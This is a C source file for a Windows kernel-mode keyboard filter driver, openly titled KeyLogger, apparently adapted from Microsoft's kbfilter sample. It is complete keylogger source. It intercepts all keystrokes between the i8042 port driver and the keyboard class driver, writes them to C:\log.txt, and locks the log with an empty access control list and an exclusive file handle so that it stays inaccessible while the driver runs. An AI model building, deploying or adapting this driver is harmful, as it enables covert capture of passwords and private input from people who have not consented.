#include "keylogger.h"

/**
 *
 * KeyLogger
 *
 * Simple Key Logger KMDF Driver.
 *
 * Author: Adrianna Piekarska
 *
 * Description:
 *
 *	Driver that hooks itself between the KbdClass driver and i8042prt driver
 *	and intercepts keystrokes. Intercepted data is written to a log file,
 *	which default location is C:\log.txt. Writing to the file is being done
 *	by the separate system worker thread. The driver creates the worker and
 *	later uses it whenever there is enough data in the buffer. The trigger
 *	point for writing the data can be set by modifying the LOG_TRIGGER_POINT
 *	define directive. Because the keystrokes are written to file in the
 *	blocks of fixed size, there is a possibility of the logger being unable
 *	to record last keystrokes in case of driver being unloaded when the buffer
 *	is not full. This problem can be overcome by setting LOG_TRIGGER_POINT
 *	to 1. However then disk access frequency increases.
 *
 *	The log file is protected from accessing by any user by configuring the
 *	proper Discretionary Access Control List. This however does not prevent
 *  system administrator to take ownership of the file. But even then, the
 *	file cannot be accessed by anyone during the lifetime of the driver as
 *	the driver keeps the handle to the file open and unaccessible to other
 *	processes (by specyfing the exclusive access to the created file).
 *
 *  Due to the fact that the driver unload routine in case of PnP drivers
 *	can be called at any time after the device is removed (and it seems that
 *  it is called only when the new driver is being loaded in the place of the
 *	previous one), the permissions of the log file must be reset manually so
 *	that the contents of the log can be examined.
 *
 *	Based on Microsofts' kbfilter driver.
 *
 **/

#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#pragma alloc_text (PAGE, KeyLogger_EvtDeviceAdd)
#pragma alloc_text (PAGE, KeyLogger_EvtIoInternalDeviceControl)
#endif

HANDLE				fileHandle;				// Handle for the log file.
											// Remains open throughout
											// the driver's lifetime.

KEYBOARD_DATA_ARRAY keyboardDataArray;		// Structure that holds the
											// global array.

ULONG				written;				// Total number of records
											// written to the file.

#define				LOG_TRIGGER_POINT 16	// Value at which the writing
											// work item fires.

#define				SZ_KEYTABLE 0x53		// Size of the scancodes table.

char* keytable[SZ_KEYTABLE] =				// Scancodes table.
{
	"[INVALID]",
	"`",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"[BACKSPACE]",
	"[INVALID]",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"[ENTER]",
	"[CTRL]",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"\'"
	"'",
	"[LSHIFT]",
	"\\",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"[RSHIFT]",
	"[INVALID]",
	"[ALT]",
	"[SPACE]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"7",
	"8",
	"9",
	"[INVALID]",
	"4",
	"5",
	"6",
	"[INVALID]",
	"1",
	"2",
	"3",
	"0"
};


NTSTATUS
InitKeyboardDataArray
(
)
/**
 *
 * Initialize Keyboard Data Array. Create spin lock protecting it.
 *
 * Return:
 *
 *		Status of the operation.
 *
 **/
{
	NTSTATUS status = STATUS_SUCCESS;

	//
	// Set the initial index to 0
	//
	keyboardDataArray.index = 0;

	//
	// Create spin lock that protects the buffer.
	//
	WDF_OBJECT_ATTRIBUTES spinLockAttributes;
	WDF_OBJECT_ATTRIBUTES_INIT(&spinLockAttributes);

	status = WdfSpinLockCreate(&spinLockAttributes, &keyboardDataArray.spinLock);

	if (!NT_SUCCESS(status))
	{
		DebugPrint(("WdfSpinLockCreate failed with code: %x\n", status));
		return status;
	}

	return status;
}

VOID
AddToBuffer
(
	PKEYBOARD_INPUT_DATA entry
)
/**
 *
 * Add an element to the array by first obtaining the
 * spin lock, then performing addition, and finally
 * releasing the spin lock.
 *
 * Arguments:
 *
 *		PKEYBOARD_INPUT_DATA entry
 *			Entry to add.
 *
 **/
{
	WdfSpinLockAcquire(keyboardDataArray.spinLock);
	
	keyboardDataArray.buffer[keyboardDataArray.index] = *entry;
	keyboardDataArray.index++;
	
	WdfSpinLockRelease(keyboardDataArray.spinLock);

}

DWORD
DumpBuffer
(
	PKEYBOARD_INPUT_DATA dest
)
/**
 *
 * Dump all entries from the keyboard data buffer by first
 * obtaining the spin lock, then performing extraction, and
 * finally releasing the spin lock.
 *
 * Arguments:
 *
 *		PKEYBOARD_INPUT_DATA dest
 *			Where to place the contents of the buffer.
 *
 * Return:
 *
 *		The number of the entries obtained.
 *
 **/
{	
	DWORD n = 0;

	WdfSpinLockAcquire(keyboardDataArray.spinLock);

	if (dest != NULL)
	{
		DWORD i;
		for (i = 0; i < keyboardDataArray.index; i++)
		{
			dest[i] = keyboardDataArray.buffer[i];
		}
		n = i;
		keyboardDataArray.index = 0;
	}

	WdfSpinLockRelease(keyboardDataArray.spinLock);

	return n;
}

NTSTATUS
OpenLogFile
(
)
/**
 *
 * Open the log file for writing. If the file does not yet exist.,
 * create it.
 *
 * Return:
 *
 *		Status of the operation.
 **/
{

	IO_STATUS_BLOCK		ioStatusBlock;
	OBJECT_ATTRIBUTES	fileObjectAttributes;
	NTSTATUS			status;
	UNICODE_STRING		fileName;

	//
	// Initialize file name
	//
	RtlInitUnicodeString(&fileName, L"\\DosDevices\\c:\\log.txt");

	//
	// Initialize file attributes
	//
	InitializeObjectAttributes(
		&fileObjectAttributes,
		&fileName,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);

	status = STATUS_SUCCESS;

	//
	// Create file
	//
	status = ZwCreateFile(
		&fileHandle,
		GENERIC_WRITE,
		&fileObjectAttributes,
		&ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,				// Exclusive access to the file
		FILE_OPEN_IF,
		FILE_RANDOM_ACCESS,
		NULL,
		0);

	if (!NT_SUCCESS(status))
	{
		return status;
	}

	return status;
}

NTSTATUS
WriteToLogFile
(
	DWORD					n,
	PKEYBOARD_INPUT_DATA	buffer
)
/**
 *
 * Write buffer to the log file.
 *
 * Arguments:
 *
 *		DWORD n
 *			Number of entries of type KEYBOARD_INPUT_DATA to
 *			be written to the log file.
 *
 *		PKEYBOARD_INPUT_DATA buffer
 *			Buffer containing the data to be written. Note that
 *			this is NOT the global keyboard data buffer, but a
 *			safe copy that the work item holds.
 *
 * Return:
 *
 *		Status of the operation.
 *
 **/
{
	NTSTATUS		status;
	DWORD			i;
	USHORT			scancode, flags;

	//
	// Prepare buffer containing characters to write to the file
	//
	CHAR writeBuffer	[SZ_KEYBOARD_DATA_ARRAY * 20];
	writeBuffer[0]		= '\0';

	//
	// Write every scan code to the write buffer, with respect
	// to the flags (pressed, released)
	//
	for (i = 0; i < n; i++)
	{
		scancode		= buffer[i].MakeCode;
		flags			= buffer[i].Flags;

		CHAR* asciiRepr = keytable[scancode];

		if (scancode >= 0 && scancode < SZ_KEYTABLE)
		{
			strcat(writeBuffer, asciiRepr);
		}
		else
		{
			strcat(writeBuffer, "[N/A]");
		}

		if (flags == KEY_MAKE)
		{
			if (strlen(asciiRepr) > 8)
			{
				strcat(writeBuffer, "\tPressed\r\n");
			}
			else
			{
				strcat(writeBuffer, "\t\tPressed\r\n");
			}
		}
		else
		{
			if (strlen(asciiRepr) > 8)
			{
				strcat(writeBuffer, "\tReleased\r\n");
			}
			else
			{
				strcat(writeBuffer, "\t\tReleased\r\n");
			}
		}
	}

	IO_STATUS_BLOCK		ioStatusBlock;
	LARGE_INTEGER		ByteOffset;
	
	ByteOffset.HighPart = -1;
	ByteOffset.LowPart	= FILE_WRITE_TO_END_OF_FILE;

	status = STATUS_SUCCESS;

	//
	// Write to the file
	//
	status = ZwWriteFile(
		fileHandle,
		NULL,
		NULL,
		NULL,
		&ioStatusBlock,
		writeBuffer,
		strlen(writeBuffer),
		&ByteOffset,
		NULL);

	if (!NT_SUCCESS(status))
	{
		DebugPrint(("Write to log failed with code: 0x%x\n", status));
		goto Exit;
	}

Exit:
	written += n;
	DebugPrint(("Total elements written: %lu\n", written));
	return status;
}

NTSTATUS
SetFileDacl
(
)
/**
 *
 * Set the Discretionary Access Control List (DACL) on
 * a log file.
 *
 * Return:
 *
 *		Status of the operation.
 *
 **/
{
	SECURITY_DESCRIPTOR		sd;
	PACL					acl;
	NTSTATUS				status;

	acl = NULL;
	status = STATUS_SUCCESS;

	//
	// Allocate memory for ACL
	//
	acl = ExAllocatePool(PagedPool, PAGE_SIZE);

	if (acl == NULL)
	{
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto Exit;
	}

	//
	// Create ACL
	//
	status = RtlCreateAcl(
		acl,
		PAGE_SIZE,
		ACL_REVISION
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Create security descriptor
	//
	status = RtlCreateSecurityDescriptor(
		&sd,
		SECURITY_DESCRIPTOR_REVISION
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Associate the empty ACL with the security descriptor.
	// If there are no ACE in the DACL, the system will not allow
	// access to anyone.
	//
	status = RtlSetDaclSecurityDescriptor(&sd, TRUE, acl, FALSE);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Set security on the object
	//
	status = ZwSetSecurityObject(
		fileHandle,
		DACL_SECURITY_INFORMATION,
		&sd
	);

	if (!NT_SUCCESS(status)) {

		goto Exit;

	}

Exit:
	if (acl != NULL)
	{
		//
		// Free resources
		//
		ExFreePool(acl);
		acl = NULL;
	}

	return status;
}

NTSTATUS
ResetFileDacl
(
)
/**
 * Reset file Discretionary Access Control List to
 * restore basic permissions.
 *
 * Return:
 *
 *		Status of the operation.
 *
 **/
{
	SECURITY_DESCRIPTOR		sd;
	PACL					pAcl;
	NTSTATUS				status;

	pAcl = NULL;
	status = STATUS_SUCCESS;

	//
	// Allocate memory for ACL
	//
	pAcl = ExAllocatePool(PagedPool, PAGE_SIZE);

	if (pAcl == NULL)
	{
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto Exit;
	}

	//
	// Create ACL
	//
	status = RtlCreateAcl(
		pAcl,
		PAGE_SIZE,
		ACL_REVISION
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Create an Access Control Entries that will restore basic
	// rights to the file for system, administrators and users
	//

	//
	// System ACE
	//
	status = RtlAddAccessAllowedAce(
		pAcl,
		ACL_REVISION,
		GENERIC_READ | GENERIC_WRITE | DELETE,
		SeExports->SeLocalSystemSid
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Administrators ACE
	//
	status = RtlAddAccessAllowedAce(
		pAcl,
		ACL_REVISION,
		GENERIC_READ | GENERIC_WRITE | DELETE,
		SeExports->SeAliasAdminsSid
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Users ACE
	//
	status = RtlAddAccessAllowedAce(
		pAcl,
		ACL_REVISION,
		GENERIC_READ,
		SeExports->SeAliasUsersSid
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Create security descriptor
	//
	status = RtlCreateSecurityDescriptor(
		&sd,
		SECURITY_DESCRIPTOR_REVISION
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Associate the empty ACL with the security descriptor.
	// If there are no ACE in the DACL, the system will not allow
	// access to anyone.
	//
	status = RtlSetDaclSecurityDescriptor(&sd, TRUE, pAcl, FALSE);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

	//
	// Set security on the object
	//
	status = ZwSetSecurityObject(
		fileHandle,
		DACL_SECURITY_INFORMATION,
		&sd
	);

	if (!NT_SUCCESS(status))
	{
		goto Exit;
	}

Exit:

	if (pAcl != NULL)
	{
		//
		// Free resources
		//
		ExFreePool(pAcl);
		pAcl = NULL;
	}

	return status;
}

NTSTATUS
DriverEntry(
    IN PDRIVER_OBJECT  DriverObject,
    IN PUNICODE_STRING RegistryPath
)
/**
 *
 * Installable driver initialization entry point.
 * This entry point is called directly by the I/O system.
 *
 * Arguments:
 *
 *		PDRIVER_OBJECT DriverObject
 *			Pointer to the driver object
 *
 *		PUNICODE_STRING RegistryPath
 *			Pointer to a unicode string representing the path,
 *           to driver-specific key in the registry.
 *
 * Return Value:
 *
 *		Status of the operation.
 *
 **/
{
    WDF_DRIVER_CONFIG               config;
    NTSTATUS                        status;

    DebugPrint(("KeyLogger KMDF Driver.\n"));
    DebugPrint(("Built %s %s\n", __DATE__, __TIME__));

    //
    // Initiialize driver config.
	//
    WDF_DRIVER_CONFIG_INIT(
        &config,
        KeyLogger_EvtDeviceAdd
    );

	//
	// Specify driver's Unload function.
	//
	//config.EvtDriverUnload = DriverUnload;

    //
    // Create a framework driver object.
    //
    status = WdfDriverCreate(
		DriverObject,
        RegistryPath,
        WDF_NO_OBJECT_ATTRIBUTES,
        &config,
        WDF_NO_HANDLE
	);

    if (!NT_SUCCESS(status))
	{
        DebugPrint(("WdfDriverCreate failed with status 0x%x\n",
			status));
	}
	
	return status;
}

NTSTATUS
KeyLogger_EvtDeviceAdd(
    IN WDFDRIVER        Driver,
    IN PWDFDEVICE_INIT  DeviceInit
)
/**
 * 
 * DeviceAdd routine.
 * Called in response to AddDevice call from PnP manager.
 *
 **/
{
    WDF_OBJECT_ATTRIBUTES   deviceAttributes;
    NTSTATUS                status;
    WDFDEVICE               hDevice;
    PDEVICE_EXTENSION       filterExt;
    WDF_IO_QUEUE_CONFIG     ioQueueConfig;

    UNREFERENCED_PARAMETER(Driver);

    PAGED_CODE();

    //
    // Tell the framework that you are filter driver. Framework
    // takes care of inherting all the device flags & characterstics
    // from the lower device you are attaching to.
    //
    WdfFdoInitSetFilter(DeviceInit);

    WdfDeviceInitSetDeviceType(
		DeviceInit,
		FILE_DEVICE_KEYBOARD
	);

    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(
		&deviceAttributes,
		DEVICE_EXTENSION
	);

    //
    // Create a framework device object.
	//
    status = WdfDeviceCreate(
		&DeviceInit,
		&deviceAttributes,
		&hDevice
	);

    if (!NT_SUCCESS(status))
	{
        DebugPrint(("WdfDeviceCreate failed with status code 0x%x\n",
			status));
        return status;
    }

	//
	// Get device extension data.
	//
    filterExt = GetDeviceExtension(hDevice);

    //
    // Configure the default queue to be Parallel. Do not use sequential queue
    // if this driver is going to be filtering PS2 ports because it can lead to
    // deadlock. The PS2 port driver sends a request to the top of the stack when it
    // receives an ioctl request and waits for it to be completed. If you use a
    // a sequential queue, this request will be stuck in the queue because of the 
    // outstanding ioctl request sent earlier to the port driver.
    //
    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(
		&ioQueueConfig,
        WdfIoQueueDispatchParallel
	);

    //
    // Framework by default creates non-power managed queues for
    // filter drivers.
    //
    ioQueueConfig.EvtIoInternalDeviceControl = KeyLogger_EvtIoInternalDeviceControl;

    status = WdfIoQueueCreate(
		hDevice,
        &ioQueueConfig,
        WDF_NO_OBJECT_ATTRIBUTES,
        WDF_NO_HANDLE
	);

    if (!NT_SUCCESS(status))
	{
        DebugPrint( ("WdfIoQueueCreate failed 0x%x\n", status));
        return status;
    }

	//
	// Create work item.
	//
	CreateWorkItem(hDevice);

	//
	// Initialize global structures, create, open and set proper permissions
	// on the log file. This is done to deny any access to the file while
	// the driver is loaded. Howerver note that the administrator can always
	// change the ownership of a file, thus acquiring access to the file.
	// This should however never happen when the driver is loaded, as it
	// keeps handle to the log file open.
	//
	InitKeyboardDataArray();
	OpenLogFile();
	SetFileDacl();

	//
	// Set total written records field to 0.
	//
	written = 0;

    return status;
}


VOID
KeyLogger_EvtIoInternalDeviceControl(
    IN WDFQUEUE      Queue,
    IN WDFREQUEST    Request,
    IN size_t        OutputBufferLength,
    IN size_t        InputBufferLength,
    IN ULONG         IoControlCode
)
/**
 *
 * Dispatch routine for internal device control requests.
 * 
 **/
{
    PDEVICE_EXTENSION               devExt;
    PINTERNAL_I8042_HOOK_KEYBOARD   hookKeyboard = NULL;
    PCONNECT_DATA                   connectData = NULL;
    NTSTATUS                        status = STATUS_SUCCESS;
    size_t                          length;
    WDFDEVICE                       hDevice;
    BOOLEAN                         ret = TRUE;
    WDF_REQUEST_SEND_OPTIONS        options;

    UNREFERENCED_PARAMETER(OutputBufferLength);
    UNREFERENCED_PARAMETER(InputBufferLength);
	UNREFERENCED_PARAMETER(hookKeyboard);

    PAGED_CODE();


    hDevice = WdfIoQueueGetDevice(Queue);
    devExt = GetDeviceExtension(hDevice);

    switch (IoControlCode)
	{
	//
    // Connect a keyboard class device driver to the port driver.
    //
    case IOCTL_INTERNAL_KEYBOARD_CONNECT:
        //
        // Only allow one connection.
        //
        if (devExt->UpperConnectData.ClassService != NULL) {
            status = STATUS_SHARING_VIOLATION;
            break;
        }

        //
        // Get the input buffer from the request
        // (Parameters.DeviceIoControl.Type3InputBuffer).
        //
        status = WdfRequestRetrieveInputBuffer(Request,
                                    sizeof(CONNECT_DATA),
                                    &connectData,
                                    &length);
        if(!NT_SUCCESS(status)){
            DebugPrint(("WdfRequestRetrieveInputBuffer failed %x\n", status));
            break;
        }

        NT_ASSERT(length == InputBufferLength);

        devExt->UpperConnectData = *connectData;

        //
        // Hook into the report chain.  Everytime a keyboard packet is reported
        // to the system, KbFilter_ServiceCallback will be called
        //

        connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(hDevice);

#pragma warning(disable:4152)  //nonstandard extension, function/data pointer conversion

        connectData->ClassService = KeyLogger_ServiceCallback;

#pragma warning(default:4152)

        break;

    //
    // Disconnect a keyboard class device driver from the port driver.
    //
    case IOCTL_INTERNAL_KEYBOARD_DISCONNECT:

        //
        // Clear the connection parameters in the device extension.
        //
        // devExt->UpperConnectData.ClassDeviceObject = NULL;
        // devExt->UpperConnectData.ClassService = NULL;

        status = STATUS_NOT_IMPLEMENTED;
        break;

    //
    // Might want to capture these in the future.  For now, then pass them down
    // the stack.  These queries must be successful for the RIT to communicate
    // with the keyboard.
    //
    case IOCTL_KEYBOARD_QUERY_INDICATOR_TRANSLATION:
    case IOCTL_KEYBOARD_QUERY_INDICATORS:
    case IOCTL_KEYBOARD_SET_INDICATORS:
    case IOCTL_KEYBOARD_QUERY_TYPEMATIC:
    case IOCTL_KEYBOARD_SET_TYPEMATIC:
        break;
    }

    if (!NT_SUCCESS(status))
	{
        WdfRequestComplete(Request, status);
        return;
    }

    //
    // We are not interested in post processing the IRP so 
    // fire and forget.
    //
    WDF_REQUEST_SEND_OPTIONS_INIT(&options,
                                    WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);

    ret = WdfRequestSend(Request, WdfDeviceGetIoTarget(hDevice), &options);

    if (ret == FALSE)
	{
        status = WdfRequestGetStatus (Request);
        DebugPrint(("WdfRequestSend failed: 0x%x\n", status));
        WdfRequestComplete(Request, status);
    }
}

VOID
KeyLogger_ServiceCallback(
    IN PDEVICE_OBJECT		DeviceObject,
    IN PKEYBOARD_INPUT_DATA InputDataStart,
    IN PKEYBOARD_INPUT_DATA InputDataEnd,
    IN OUT PULONG			InputDataConsumed
)
/**
 *
 * Callback that is called when the keyboard packets are
 * to be reported to the Win32 subsystem.
 * In this function the packets are added to the global
 * keyboard data buffer.
 *
 **/
{
    PDEVICE_EXTENSION   devExt;
    WDFDEVICE			hDevice;

    hDevice = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);

	//
	// Get the Device Extension.
	//
    devExt = GetDeviceExtension(hDevice);

	ULONG					totalKeys;
	PKEYBOARD_INPUT_DATA	inputKey;
	
	totalKeys	= (ULONG)(InputDataEnd - InputDataStart);
	inputKey	= InputDataStart;

	DWORD i;

	//
	// Loop that adds all keyboard data to the global array.
	//
	for (i = 0; i < totalKeys; i++)
	{
		AddToBuffer(&inputKey[i]);
	}

	DWORD index = keyboardDataArray.index;
	
	//
	// Check if the number of elements in the global buffer
	// exceeds or is equal to the preset point.
	//
	// Note that due to the fact that the work item is queued
	// 
	//
	if (index >= LOG_TRIGGER_POINT)
	{
		//
		// Queue work item that will write the intercepted
		// data to the log file.
		//

		//
		// Get worker item context
		//
		PWORKER_ITEM_CONTEXT workerItemContext = GetWorkItemContext(devExt->workItem);

		if (workerItemContext->hasRun)
		{
			//
			// Only queue the work item when it has not yet run.
			//

			//
			// The hasRun field will be set to false until the worker finishes
			// its job.
			//
			workerItemContext->hasRun = FALSE;
			KeyLoggerQueueWorkItem(devExt->workItem);
		}
	}

    (*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR) devExt->UpperConnectData.ClassService)(
        devExt->UpperConnectData.ClassDeviceObject,
        InputDataStart,
        InputDataEnd,
        InputDataConsumed);
}

VOID
WriteWorkItem(
	WDFWORKITEM  WorkItem
)
/**
 *
 * Work item callback. Responsible for calling PASSIVE_LEVEL functions
 * like writing to log file.
 *
 * Arguments:
 *
 *		WDFWORKITEM WorkItem
 *			WorkItem object created earlier
 *
 **/
{
	PWORKER_ITEM_CONTEXT		context;
	
	context = GetWorkItemContext(WorkItem);

	//
	// Dump the array into the worker's buffer.
	//
	DWORD n = DumpBuffer(context->buffer);

	//
	// Write dumped elements to the file.
	//
	WriteToLogFile(n, context->buffer);

	//
	// Indicate that worker has finished its job.
	//
	context->hasRun = TRUE;
}

NTSTATUS
CreateWorkItem(
	WDFDEVICE DeviceObject
)
/**
 *
 * Initialize and create work item. The created object is stored
 * in the device extension of the parameter DeviceObject.
 *
 * Arguments:
 *		
 *		WDFDEVICE DeviceObject
 *			Object containing work item in its device extension.
 *
 * Returns:
 *
 *		Status of the operation.
 *
 **/
{
	NTSTATUS status = STATUS_SUCCESS;

	WDF_OBJECT_ATTRIBUTES		workItemAttributes;
	WDF_WORKITEM_CONFIG			workitemConfig;
	//WDFWORKITEM					hWorkItem;

	WDF_OBJECT_ATTRIBUTES_INIT(&workItemAttributes);

	WDF_OBJECT_ATTRIBUTES_SET_CONTEXT_TYPE(
		&workItemAttributes,
		WORKER_ITEM_CONTEXT
	);

	workItemAttributes.ParentObject = DeviceObject;

	//
	// Configure the work item
	//
	WDF_WORKITEM_CONFIG_INIT(
		&workitemConfig,
		WriteWorkItem
	);

	//
	// Get the Device Extension
	//
	PDEVICE_EXTENSION devExt = GetDeviceExtension(DeviceObject);

	//
	// Create work item
	//
	status = WdfWorkItemCreate(
		&workitemConfig,
		&workItemAttributes,
		&(devExt->workItem)
	);

	if (!NT_SUCCESS(status)) {
		DebugPrint(("Work item creation failed with error code: 0x%x\n", status));
		return status;
	}

	PWORKER_ITEM_CONTEXT context = GetWorkItemContext(devExt->workItem);

	//
	// Set the field hasRun to true so that the work item can
	// be queued first time.
	//
	context->hasRun = TRUE;

	return status;
}

VOID
KeyLoggerQueueWorkItem(
	WDFWORKITEM workItem
)
/**
 *
 * Enqueue work item.
 *
 * Arguments:
 *
 *		WDFWORKITEM workItem
 *			Work item to enqueue.
 *
 **/
{
	WdfWorkItemEnqueue(workItem);
}


//VOID
//DriverUnload(
//	IN WDFDRIVER Driver
//)
///**
// *
// * Driver Unload routine.
// *
// **/
//{
//	UNREFERENCED_PARAMETER(Driver);
//	ResetFileDacl();
//	ZwClose(fileHandle);
//	DebugPrint(("=======================UNLOAD===================\n"));
//}
